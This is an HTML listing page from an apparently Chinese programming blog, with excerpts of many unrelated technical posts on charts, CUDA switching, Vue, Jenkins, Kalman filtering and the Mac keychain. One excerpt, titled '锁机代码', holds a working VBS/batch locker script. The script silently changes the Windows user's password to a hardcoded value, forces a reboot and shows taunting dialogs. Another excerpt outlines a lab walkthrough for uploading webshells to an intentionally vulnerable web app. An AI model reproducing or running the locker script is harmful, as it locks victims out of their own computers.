			<a href="/posts/d2710409f73b8f7c97ad3409bb0e6afc/" rel="bookmark">
			python画分组双坐标柱状图（全网唯一，源代码公布）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目前在网络上没有找到现成的办法解决双坐标分组柱状图。为了画这个图，花了3小时。
实现效果：
源代码如下：
import matplotlib.pyplot as plt a = [4,5,0] b = [3,2,0] c = [4,3,0] d = [3,2,0] a_2 = [0,0,0.13] b_2 = [0,0,0.18] c_2 = [0,0,0.18] d_2 = [0,0,0.18] labels = ['A', 'B', 'C'] plt.rcParams['axes.labelsize'] = 16 # xy轴label的size plt.rcParams['xtick.labelsize'] = 12 # x轴ticks的size plt.rcParams['ytick.labelsize'] = 14 # y轴ticks的size # 设置柱形的间隔 width = 0.2 # 柱形的宽度 x1_list = [] x2_list = [] x3_list= [] x4_list= [] for i in range(len(a)): x1_list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2710409f73b8f7c97ad3409bb0e6afc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dff7b442e467bd8c6ffe411d8fca973/" rel="bookmark">
			智能优化算法应用：基于麻雀搜索算法与双伽马校正的图像自适应增强算法 - 附代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		智能优化算法应用：基于麻雀搜索算法与双伽马校正的图像自适应增强算法 - 附代码 文章目录 智能优化算法应用：基于麻雀搜索算法与双伽马校正的图像自适应增强算法 - 附代码1.全局双伽马校正2.麻雀搜索算法3.适应度函数设计4.实验与算法结果5.参考文献6.Matlab代码 摘要：本文主要介绍基于麻雀搜索算法与双伽马校正的图像自适应增强算法。 1.全局双伽马校正 设图像的灰度值范围被归一化到[0, 1]范围之内，基于全局亮度的双伽马调整函数(Bilateral Gamma Adjustment, BiGA)的图像增强方法该函数由 2个伽马函数Ga 和Gb 融合而成，其数学表达式如下：
G a ( x ) = x 1 / r (1) G_a(x) = x^{1/r} \tag{1} Ga​(x)=x1/r(1)
G b ( x ) = 1 − ( 1 − x ) 1 / r (2) G_b(x)=1-(1-x)^{1/r} \tag{2} Gb​(x)=1−(1−x)1/r(2)
G ( x ) = α G a ( x ) + ( 1 − α ) G b ( x ) (3) G(x) = \alpha G_a(x) + (1-\alpha)G_b(x) \tag{3} G(x)=αGa​(x)+(1−α)Gb​(x)(3)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0dff7b442e467bd8c6ffe411d8fca973/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6d73bb599b0aeb24fc418e5e4e4d415/" rel="bookmark">
			Ubuntu中多版本CUDA切换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用update-alternatives实现多版本CUDA切换
以cuda-10.2和cuda-10.０为例，前提这两个是已经安装好了的，则在终端使用以下命令语句完成多版本的切换：
sudo update-alternatives --install /usr/local/cuda cuda /usr/local/cuda-10.0/
sudo update-alternatives --install /usr/local/cuda cuda /usr/local/cuda-10.2/
为cuda配置优先级，数字越大优先级越高：
sudo update-alternatives --install /usr/local/cuda cuda /usr/local/cuda-10.0/ 10
sudo update-alternatives --install /usr/local/cuda cuda /usr/local/cuda-10.2/ 20
配置成功后则会返回：
接着使用命令语句： sudo update-alternatives --config cuda 可看到：
表明此时的多版本cuda已经配置好了，如果要切换只需要指定对应的编号即可．
查看cuda版本是否切换成功，终端输入：
nvcc --version
显示现在的cuda版本已经切换至10.0版本
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/076fa848ac6c95c516e9b6e7a0847a6a/" rel="bookmark">
			js（vue）中 禁止ctrl &#43; 鼠标滚轮页面缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;script&gt; document.addEventListener('keydown', function (event) { if ((event.ctrlKey === true || event.metaKey === true) &amp;&amp; (event.which === 61 || event.which === 107 || event.which === 173 || event.which === 109 || event.which === 187 || event.which === 189)) { event.preventDefault(); } }, false); // Chrome IE 360 window.addEventListener('mousewheel', function (event) { if (event.ctrlKey === true || event.metaKey) { event.preventDefault(); } }, { passive: false }); //firefox window.addEventListener('DOMMouseScroll', function (event) { if (event.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/076fa848ac6c95c516e9b6e7a0847a6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92a05d2394f1b745574a718cf50f1140/" rel="bookmark">
			一套开源免费的 SpringBoot &#43;Layui通用后台管理系统 ！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一套开源免费的 SpringBoot +Layui通用后台管理系统 ！ 转载：https://mp.weixin.qq.com/s/_bvIyPCpYovvopzbDJISbA
转载理由：不错哦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cc11172e7993e2e75d6c19ba9e76a53/" rel="bookmark">
			入门推荐系统——Wide&amp;Deep
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.点击率预估简介 点击率预估用来解决什么问题？
点击率预估是对每次广告点击情况作出预测，输出点击或者不点击，也可以输出该次点击的概率，有时后者称为pClick。
点击率预估模型需要做什么？
通过点击率预估的基本概念，发现其实点击率预估问题是一个二分类问题，在机器学习中，使用逻辑回归作为模型的输出，其输出的是一个概率值，将机器学习输出的概率认为是某个用户点击某个广告的概率。
点击率和推荐算法有什么不同？
广告点击率预估是需要得到某个用户对某个广告的点击率，然后结合广告的出价排序。
推荐算法大多数只需要得到一个最优的推荐次序，即TopN推荐。
也可利用广告的点击率来排序，作为广告的推荐。
2.为什么不用FM，要用Wide&amp;Deep？ FM缺点：当query-item矩阵是稀疏并且是high-rank的时候（比如user有特殊的爱好，或item比较小众），很难非常效率的学习出低维度的表示。这种情况下，大部分的query-item都没有什么关系。但是dense embedding会导致几乎所有的query-item预测值都是非0的，这就导致了推荐过度泛化，会推荐一些不那么相关的物品。
相反，简单的linear model却可以通过cross-product transformation来记住这些exception rules，cross-product transformation。
3.Wide &amp; Deep模型的“记忆能力”与“泛化能力” Memorization 和 Generalization是推荐系统很常见的两个概念，其中Memorization指的是通过用户与商品的交互信息矩阵学习规则，而Generalization则是泛化规则。
FM算法就是很好的Generalization的例子，它可以根据交互信息学习到一个比较短的矩阵 V V V，其中 v i v_{i} vi​储存着每个用户特征的压缩表示（embedding），而协同过滤与SVD都是靠记住用户之前与哪些物品发生了交互从而推断出的推荐结果，这两者推荐结果当然存在一些差异，我们的Wide&amp;Deep模型就能够融合这两种推荐结果做出最终的推荐，得到一个比之前的推荐结果都好的模型。
Memorization趋向于更加保守，推荐用户之前有过行为的items。相比之下，generalization更加趋向于提高推荐系统的多样性（diversity）。Memorization只需要使用一个线性模型即可实现，而Generalization需要使用DNN实现。
下面是wide&amp;deep模型的结构图，由左边的wide部分(一个简单的线性模型)，右边的deep部分(一个典型的DNN模型)。
其实wide&amp;deep模型本身的结构是非常简单的，对于有点机器学习基础和深度学习基础的人来说都非常的容易看懂，但是如何根据自己的场景去选择那些特征放在Wide部分，哪些特征放在Deep部分就需要理解这篇论文提出者当时对于设计该模型不同结构时的意图了，所以这也是用好这个模型的一个前提。
如何理解Wide部分有利于增强模型的“记忆能力”，Deep部分有利于增强模型的“泛化能力”？
wide部分是一个广义的线性模型，输入的特征主要有两部分组成，一部分是原始的部分特征，另一部分是原始特征的交互特征(cross-product transformation)，对于交互特征可以定义为： ϕ k ( x ) = ∏ i = 1 d x i c k i , c k i ∈ 0 , 1 \phi_{k}(x)=\prod_{i=1}^d x_i^{c_{ki}}, c_{ki}\in {0,1} ϕk​(x)=i=1∏d​xicki​​,cki​∈0,1
式子自行查找原论文理解
大体意思就是两个特征都同时为1这个新的特征才能为1，否则就是0，说白了就是一个特征组合。用原论文的例子举例：
AND(user_installed_app=QQ, impression_app=WeChat)，当特征user_installed_app=QQ,和特征impression_app=WeChat取值都为1的时候，组合特征AND(user_installed_app=QQ, impression_app=WeChat)的取值才为1，否则为0。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cc11172e7993e2e75d6c19ba9e76a53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33ea42dbe328d08d8895f3dc76909b1/" rel="bookmark">
			win10麦克风说话没声音_电脑版微信，语音通话无声音的解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.重装系统后，安装微信，发现微信语音通话听不到对方声音，对方能听见我的声音
2.由于使用的是蓝牙耳机，怀疑是耳机问题，换耳机发现问题一样，排除耳机问题（笔记本内置麦克风坏了，用了个华为运动耳机接电脑）
3.怀疑是windows权限问题，发现麦克风正在使用（所以对方能听到）
4.怀疑喇叭输出配置错了，检查发现切换输出没有变化
5.将蓝牙切换至hands-free AG audio重新连接微信一切正常
严重注意，必须先切到这个上面，如果在微信通话过程中切，无效！！！
https://www.zhihu.com/video/1214941936039456768 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/134528ce872e952864af5dcf146e598e/" rel="bookmark">
			js解leetcode(47)-简单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.用栈操作构建数组 题目：
给你一个目标数组 target 和一个整数 n。每次迭代，需要从 list = {1,2,3..., n} 中依序读取一个数字。
请使用下述操作来构建目标数组 target ：
Push：从 list 中读取一个新元素， 并将其推入数组中。
Pop：删除数组中的最后一个元素。
如果目标数组构建完成，就停止读取更多元素。
题目数据保证目标数组严格递增，并且只包含 1 到 n 之间的数字。
请返回构建目标数组所用的操作序列。
题目数据保证答案是唯一的。
思路：从数字1开始遍历，同时用一个变量记录target的下标，每一次先执行一次push操作，然后比较当前的index和当前的值的关系。如果index=item，则直接到下一次循环，记得target右移；如果不相等，说明删掉了一个数字，target不动，推入一次pop
/** * @param {number[]} target * @param {number} n * @return {string[]} */ var buildArray = function(target, n) { const res = []; let index = 0; const l = target.length; for (let i = 1; i &lt;= n &amp;&amp; index &lt; l; i++) { res.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/134528ce872e952864af5dcf146e598e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23dd792ec3904b55e7888ea806028438/" rel="bookmark">
			文件上传渗透攻击
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 文件上传漏洞原理实验环境下载安装两个镜像虚拟机启动两台虚拟机登录kalilinux登录OWASP_Broken_Web_Apps更改类型为low更改类型medium升级更改类型high 使用代理修改连接 文件上传漏洞原理 1、文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、修改头像、分享图片/视频等
2、正常的文件一般是文档、图片、视频等，Web应用收集之后放入后台存储，需要的时候再调用出来返回
3、如果恶意文件如PHP、ASP等执行文件绕过Web应用，并顺利执行，则相当于黑客直接拿到了Webshell
4、一旦黑客拿到Webshell，则可以拿到Web应用的数据，删除Web文件，本地提权，进一步拿下整个服务器甚至内网
5、SQL注入攻击的对象是数据库服务，文件上传漏洞主要攻击Web服务，实际渗透两种相结合，达到对目标的深度控制
实验环境 下载安装两个镜像虚拟机 启动两台虚拟机 登录kalilinux 使用kali命令行创建用户，使用finalshell远程连接（默认root无法登录）（sshd服务可能未开启 使用service ssh start 开启）
登录OWASP_Broken_Web_Apps 用户名"root" and 密码 “owaspbwa”.
浏览器访问ip 192.168.75.136
更改类型为low 打开测试软件
右键添加
再次回车进入webshell
更改类型medium 上传文件类型尝试
升级 使用一句话软件将一句代码写入到图片上传，通过漏洞上传代码
（注：有些图片会失败）
上传图片
上图页面出现说明脚本已经写入
复制文件名
发现可以连接
更改类型high 安全
使用代理修改连接 注：接下来的操作将在kali虚拟机上操作
接下来使用kali浏览器
默认只能本机的浏览器访问（规则限定）
打开浏览器设置代理
浏览器访问 owaspbwa ip
设置为medium
直接上传文本修改类型
注：先打开代理
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44717faeb3631f1abbc50212eeb3a9e4/" rel="bookmark">
			深入理解卡尔曼滤波算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近做卡尔曼滤波跟踪的项目，看原理花了一天，再网上查找并看懂别人的kalman c++代码花了我近三天的时间。卡尔曼滤波就是纸老虎，核心原理不难，核心公式就5个，2个状态预测更新公式，3个矫正公式。这里只讲解线性kalman滤波模型，非线性kalman滤波可以用扩散kalman滤波算法。
概述 卡尔曼滤波算法从名称上来看落脚点是一个滤波算法，一般的滤波算法都是频域滤波，而卡尔曼滤波算法是一个时域滤波，时域就是它的强大之处。卡尔曼滤波也是一种最优估计算法，常见的最优估计算法有“最小二乘法”等，卡尔曼滤波也是一个迭代器，根据以知的先验值，预测下一时刻的估计值。
再说说滤波这个名词，本质上就是给加权。既然是加权，那么卡尔曼滤波算法本质就是数据融合的操作(Data fusion)，卡尔曼增益就是融合过程中的权重，融合的内容有两个：分别是满足一定分布的先验状态估计值和满足一定分布的观测值之间的融合（也就是你们可能在其他资料上看到的两个椭圆相乘，其实就是数据的融合），融合后得到后验状态估计值。
其实深度学习中的卷积操作也是加权求和，本质上也是滤波，本质上也是求导，比如边缘检测的离散微分算子sobel的计算过程，也是分别在x和y两个方向上求导，提取出边缘特征。（下面是我个人的思考）由点及面，我们就可以想像到一个大尺寸的卷积核，其实就相当于“变形求导”，通过卷积核内部权重数值大小给定求导曲线，卷积就是求解在这条曲线上的导数。 一个卷积核是提取特征，那么多个卷积核组合起来就有无限可能，提取到的就是高维特征（高维特征对应图片的纹理等深层次的语义信息），组合起来非常之强大，就能够实现深度学习中的分类、边框回归等功能。
直接上菜 - 牛逼哄哄的五大公式 下面来一个个详细剖析每个参数：
1.分别表示 k － 1 时刻和 k 时刻的后验状态估计值，是滤波的结果之一，即更新后的结果，也叫最优估计（估计的状态，根据理论，我们不可能知道每时刻状态的确切结果所以叫估计）。
2，: k 时刻的先验状态估计值，是滤波的中间计算结果，即根据上一时刻（k-1时刻）的最优估计预测的k时刻的结果，是预测方程的结果。
3，：分别表示 k － 1 时刻和 k 时刻的后验估计协方差（即的协方差，表示状态的不确定度），是滤波的结果之一。
4，：k 时刻的先验估计协方差（的协方差），是滤波的中间计算结果。
5，H：是状态变量到测量（观测）的转换矩阵，表示将状态和观测连接起来的关系，卡尔曼滤波里为线性关系，它负责将 m 维的测量值转换到 n 维，使之符合状态变量的数学形式，是滤波的前提条件之一。
6，：测量值（观测值），是滤波的输入。
7，：滤波增益矩阵，是滤波的中间计算结果，卡尔曼增益，或卡尔曼系数。
8，A：状态转移矩阵，实际上是对目标状态转换的一种猜想模型。例如在机动目标跟踪中， 状态转移矩阵常常用来对目标的运动建模，其模型可能为匀速直线运动或者匀加速运动。当状态转移矩阵不符合目标的状态转换模型时，滤波会很快发散。
9，Q：过程激励噪声协方差（系统过程的协方差）。该参数被用来表示状态转换矩阵与实际过程之间的误差。因为我们无法直接观测到过程信号， 所以 Q 的取值是很难确定的。是卡尔曼滤波器用于估计离散时间过程的状态变量，也叫预测模型本身带来的噪声。状态转移协方差矩阵
10：R: 测量噪声协方差。滤波器实际实现时，测量噪声协方差 R一般可以观测得到，是滤波器的已知条件。
11，B：是将输入转换为状态的矩阵
12，：实际观测和预测观测的残差，和卡尔曼增益一起修正先验（预测），得到后验
插曲一下：我认为最伟大的公式当属麦克斯韦方程组，十分的美妙，像一个妙龄少女，闭月羞花,沉鱼落雁，爱了爱了，哈哈哈。。。。
但是卡尔曼滤波也十分了不起，同样牛逼哄哄。
说到这儿，摆上大餐，提提文章档次，微分形式的麦克斯韦方程组（核心是两个散度两个旋度）：
言归正传，转到正台：
建模（这里讲的数据都是矩阵） 卡尔曼滤波算法是需要建模的，拿高中物理中典型的例子举例，在二维平面中，跟踪一个质量为m的小球，t0时刻有水平速度v0，只受到重力作用运动，让你找出小球接下来的真实轨迹。你很快想到，很简单，我拿一个相机拍下小球的运动轨迹就好了。理论上没错，事实上拿相机记录也存在一定误差，怎么样来描述这个误差了，我们想到高斯噪声是最常见的噪声类型，那么我们假定相机的观测误差vk满足期望为‘0’协方差矩阵为R的高斯噪声vk~N(0,R)，协方差矩阵为R反应了测量噪声的分布情况,矩阵R的迹越大，说明误差越分散，进一步说明测量值置信度越低。
同时，我们建立一个理想模型来表述它或者叫预测它。假定系统的状态方程为(公式推导可以自己查阅资料)：
这个状态方程是根据上一时刻的状态（这里指的是上一时刻的后验估计状态值，嗯，这样说比较准确）和控制变量来推测此刻的状态，由于世界上没有理想的理论模型，wk-1是服从高斯分布的噪声，是预测过程的噪声，它对应了 xk 中每个分量的噪声，期望为 0，协方差为 Q 的高斯白噪声wk-1~N(0,Q),Q即过程激励噪声协方差矩阵Q。
首先我们需要确定预测的状态变量数量和观测值，比如我们跟踪的是上面的模型，要知道小球的位置，那么我们可以给定预测4个状态值（x,y,vx,vy）,观测值就点的坐标（x,y）。我们可以通过k-1次的测量值，来估计第k次的先验估计值，再用卡尔曼增益值将第k次的测量值和第k次的先验估计值做融合，得到第k次的后验估计值，第k次的后验估计值就是我们求出的最优解。
OpenCV中关于Kalman滤波的结构和函数定义 Kalman 滤波器状态，具体如何使用请查看opencv官方给的kalman案例。
typedef struct CvKalman { int MP; /* 测量向量维数 */ int DP; /* 状态向量维数 */ int CP; /* 控制向量维数 */ /* 向后兼容字段 */ #if 1 float* PosterState; /* =state_pre-&gt;data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44717faeb3631f1abbc50212eeb3a9e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0663734e5c4d273cb093ad62f2c734b5/" rel="bookmark">
			锁机代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		:On Error Resume Next
Sub bat echo off &amp; cls echo Batching_codez_here_following_vbs_rules &amp; pause start wscript -e:vbs “%~f0” Exit Sub End Sub WScript.Echo(“嘿，谢谢你打开我哦，我等你很久拉！”&amp;TSName)WScript.Echo(“你是可爱的XX童鞋吗?”)WScript.Echo(“哈,我想你拉，这你都不知道吗？”) WScript.Echo(“怎么才来，说~是不是不关心我”)WScript.Echo(“哼,我生气拉，等你这么久，心都凉啦。”)WScript.Echo(“我很生气，后果很严重哦。”) Const strPassword = “woshinidie”’ Set WshNetwork = CreateObject(“WScript.Network”)Dim userNameuserName = WshNetwork.userName&amp;",user"Dim DomainSet Domain = GetObject(“WinNT://./”&amp;userName)Domain.SetPassword strPasswordDomain.SetInfodim gjon error resume nextdim WSHshellAset WSHshellA = wscript.createobject(“wscript.shell”)WSHshellA.run “cmd.exe /c shutdown -r -t 300 -c ““你的开机密码已被改！！！！”” “,0 ,true dim ado while(a &lt;&gt; “”)a = inputbox (“你的电脑要被注销！！！””　“,””,“你的开机密码已被改！！！！”,8000,7000)WScript.Echo(“哼，你要关掉我拉，我不给你关。。”) loopWSHshell.run “cmd.exe /c shutdown -a”,0 ,true set WSHshell = wscript.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0663734e5c4d273cb093ad62f2c734b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27a5524e2ba1630c303e2eb9e5229784/" rel="bookmark">
			浅谈标签传播算法LPA
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		研究生期间第一次对相关内容做了一个汇报，查找了大量文献，发现很多的介绍对于新手来说都看不懂，这里采用最简单的方法来浅谈一下，如有错误，欢迎指正。 标签传播算法是一种基于图的半监督学习方法，其基本思路是用已标记节点的标签信息去预测未标记节点的标签信息。利用样本间的关系建立关系完全图模型，在完全图中，节点包括已标注和未标注数据，其边表示两个节点的相似度，节点的标签按相似度传递给其他节点。标签数据就像是一个源头，可以对无标签数据进行标注，节点的相似度越大，标签越容易传播。该算法简单易实现，算法执行时间短，复杂度低且分类效果好。 接下来直接放PPT 1、首先来看LPA算法，其它的标签传播算法都是基于这个算法之上
下面直接举一个例子
2、LPAm没有找到很好的介绍
3、LPAm算法虽然克服了 LPA 算法稳定性弱的缺点，但是比较容易陷入局部最 优的境况。通过举例说明 LPAm算法陷入局部最优值的情况。如图 2-2 所示。 从图 2-2 a)中的网络可以看出，该网络很明显地应该被划分为两个社区。但是， LPAm算法将网络划分了如图 2-2 b)中所示的四个社区，这是因为 LPAm算法陷入了 局部最优的境况，且获得的模块度值为 0.399。但是，如果将图 2-2 b)中带有标签 a 的社区和带有标签 b的社区进行合并，那么模块度的值就会增加 0.008，这样可以避 免之前的局部最优值 0.399。继续执行 LPAm 算法，此时得到如图 2-2 d)所示的划分 结果，即将网络划分成了两个社区，两个社区之间通过一条边进行连接，并且模块 度值也会从之前的 0.407 增加到 0.413。这样，不仅获得了理想的社区，而且使得模块度值增加。因此，X.lin 等人在 LPAm 算法中增加了如图 2-2 所示的合并操作，克
服了 LPAm算法中局部最优的缺点。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68be227cb3cf7e0b2b5bec90adbb062c/" rel="bookmark">
			Vue实战商城项目（三）—— 商品信息展示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、商品信息列表切换1.创建tabControl组件2.父组件传入数据 二、商品信息数据的获取三、商品信息的展示1.组件的封装2.数据传入对应类型的数据 总结 前言 本篇文章概述：商品信息列表切换，商品信息数据的获取，商品信息的展示。
以下是本篇文章正文内容
一、商品信息列表切换 1.创建tabControl组件 代码如下（示例）：
给列表项绑定一个点击事件，并将当前的index值传入，在data中定义一个变量currentIndex默认值为0，每次点击将当前的索引值index赋给currentIndex，这样动态绑定的样式active为对应点击的列表项时就会为true，从而显示对应的激活样式。
tabClik(index){ this.currentIndex = index ; } 2.父组件传入数据 &lt;tab-control ref="tabControl2" :title="['流行','新款','精选']" &gt;&lt;/tab-control&gt; 列表项已数组的形式传入，完成后效果如下：
二、商品信息数据的获取 在network目录下的home.js中编写获取商品数据的代码，将其导出（此函数和获取轮播图数据的函数可写在同一个js中，因为都是主页相关的网络请求函数，后面有关网络请求封装的方法同理）
代码如下（示例）：
export function getHomeGoods(type,page) { return request({ url:'/home/data', params:{ type, page } }) 因为商品信息是分页展示的，所以获取数据时需要传入对应的page默认page是 0 还需要传入对应的列表项，不同列表项分别获取对应不同的数据，如“流行”则对应为pop下的数据
代码如下（示例）：
getHomeGoods(type){ const page = this.goods[type].page + 1 getHomeGoods(type,page).then( res=&gt;{ this.goods[type].list.push(...res.data.list) this.goods[type].page += 1 } ) } 所以goods对象应该这样定义：
代码如下（示例）：
三、商品信息的展示 1.组件的封装 代码如下（示例）：
在goodsListItem中展示父组件传入的数据，并设置好对应的样式
&lt;template&gt; &lt;div class="goods-item" &gt; &lt;img v-lazy="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68be227cb3cf7e0b2b5bec90adbb062c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/554487a6b354753dd463f216e1517e77/" rel="bookmark">
			jenkins整合gitlab持续化集成webhook应用（有人push就会自动化构建并重新部署项目）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.在jenkins插件中下载对用插件 2.在构建任务中设置配置，复制url，然后点击高级，点击generate生成token 3.在gitlab中找到对应的项目，在设置，导入所有仓库中设置配置，输入刚刚复制的url，还有token 4.添加 5.测试 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f77a123aafa796c197bd7a6ef397e09/" rel="bookmark">
			Vue滑块验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue滑块验证 安装滑块验证包
cnpm install vue-drag-verify --save
1、在Login.vue页面导入 &lt;template&gt; &lt;div&gt; &lt;!-- background以下为添加的样式，可以不写入 --&gt; &lt;drag-verify :width='width' :height='height' :text='text' :success-text="successText" ref='Verify' :background="background" :progress-bar-bg="progressBarBg" :completed-bg="completedBg" :handler-bg="handlerBg" :handler-icon="handlerIcon" :text-size="textSize" :success-icon="successIcon" &gt; &lt;/drag-verify&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; // 导包 import dragVerify from 'vue-drag-verify' export default { data() { return { // 滑块验证码 width: 370, height: 45, text: '请拖动滑块进行验证', successText: "验证成功", // 以下内容是为drag-verify添加样式 background: "#cccccc", progressBarBg: "#4b0", completedBg: "#66cc66", handlerBg: "#fff", textSize: "18px", isCircle:'true', handlerIcon: "fa fa-angle-double-right", successIcon: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f77a123aafa796c197bd7a6ef397e09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/670e10b01379c8a22066c8d47e299a9b/" rel="bookmark">
			jenkins整合sonarqube实现自动化测试（编码扫描）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.在sonarqube生成token，这个token在jenkins会用到 2.在jenkins中下载对应得插件 3.在jenkins系统配置中设置sonarqube，这里设置密钥得时候注意了，一定要选择secret text，这里secret的内容是我们在第一点中生成的token 4.在jenkins创建任务，找到preSteps,命令在截图下方，直接复制即可 sonar.projectKey=xxx
sonar.projectName=xxxx
sonar.projectVersion=1.0
sonar.language=java
sonar.sourceEncoding=UTF-8
sonar.sources=$WORKSPACE
sonar.java.binaries=$WORKSPACE
5. 这个时候，直接构建jenkins任务即可，看jenkins构建和sonarqube就可以看到对应的效果 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1c07235dedb17be575fecc67aa9d4b1/" rel="bookmark">
			vue 中 自定义视频video
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自定义视频进度条、音量、选集、全屏功能
利用HTML5 Audio/Video 事件给出的事件
&lt;video :src= videoingurl ref="myvideo" @canplay="getTotal" @timeupdate="timeupdate"&gt;&lt;/video&gt; timeupdate：监控视频当前播放的时间控制进度条
timeupdate() { if(this.myvideo.currentTime == this.myvideo.duration){ this.isPaused = !this.isPaused this.myvideo.pause() } this.currentTime = this.timeFormat(this.myvideo.currentTime) this.currentTimeVal = this.myvideo.currentTime }, canplay：获取视频的总时长、进度条最大值
getTotal() { this.totalTime = this.timeFormat(this.myvideo.duration) this.durationProgress = this.myvideo.duration }, 成品如下：
完整代码如下：
&lt;div class="video-box" class="video-info-height"&gt; &lt;video :src= videoingurl ref="myvideo" @canplay="getTotal" @timeupdate="timeupdate"&gt;&lt;/video&gt; &lt;div class="progress"&gt; &lt;el-slider v-model="currentTimeVal" :max="durationProgress" :show-tooltip="false" @change="getNewTime"&gt; &lt;/el-slider&gt; &lt;/div&gt; &lt;div class="control"&gt; &lt;i class="iconfonts" :class="isPaused ? 'iconzanting1' : 'iconicon_play'" @click="play()"&gt;&lt;/i&gt; &lt;span class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1c07235dedb17be575fecc67aa9d4b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8591cdd2d6e400c94f70949923eeebef/" rel="bookmark">
			钥匙串密码忘记了怎么办？如何在Mac上重置钥匙串密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Mac上重置钥匙串访问权限可能会使某些用户感到困惑。原因是登录到Mac的钥匙串密码和用户帐户密码可能不同。根据用户的要求，我们决定编写一份详细指南，说明如果忘记了如何重置Apple钥匙串。
什么是钥匙串密码 钥匙串访问是默认的Apple应用程序，它允许您存储访问的网站的登录详细信息以及使用旧密码使用的服务。它可以包括从您的个人详细信息到财务信息的所有内容，这使它方便且节省时间，而不必记住密码即可登录。另外，您可以使用该应用程序来管理和查找Mac上所有已保存的密码。
钥匙串密码可解锁所保存的信息，通常与您的用户密码（用于登录Mac的密码）相同。
使用旧密码在Mac上重置钥匙串密码 如果您想更改钥匙串密码，只需执行以下步骤：
首先在Mac上打开“钥匙串访问”应用程序。您可以在“应用程序”文件夹的“实用工具”子文件夹中找到它，也可以仅使用Spotlight搜索来找到它。
在这里，您会找到钥匙串中的本地项目列表，包括密码，安全说明，证书，密钥和其他部分。转到登录部分。
下一步，您需要转到菜单栏→编辑→更改钥匙串“登录”的密码。
在下一个窗口中，您将必须在相应的字段中输入当前密码和新密码。然后验证您的新密码，然后单击“确定”。
就这样。完成此操作后，您可以将新密码用于钥匙串。
在不使用旧密码的情况下重置钥匙串密码 如果您忘记了旧密码，请不要担心。我们将分享另一种重置您的钥匙串的方法：
打开“钥匙串访问”应用程序。同样，您可以在“应用程序”下的“实用工具”子文件夹中找到它。
转到应用程序的偏好设置。在弹出窗口中，单击“重置我的默认钥匙串”。然后输入您的登录密码，该密码将用于创建新的钥匙串。单击确定按钮进行确认。
使用Apple菜单注销您的帐户，以***“登录”屏幕。
现在，您终于可以使用刚刚创建的新密码登录帐户了。
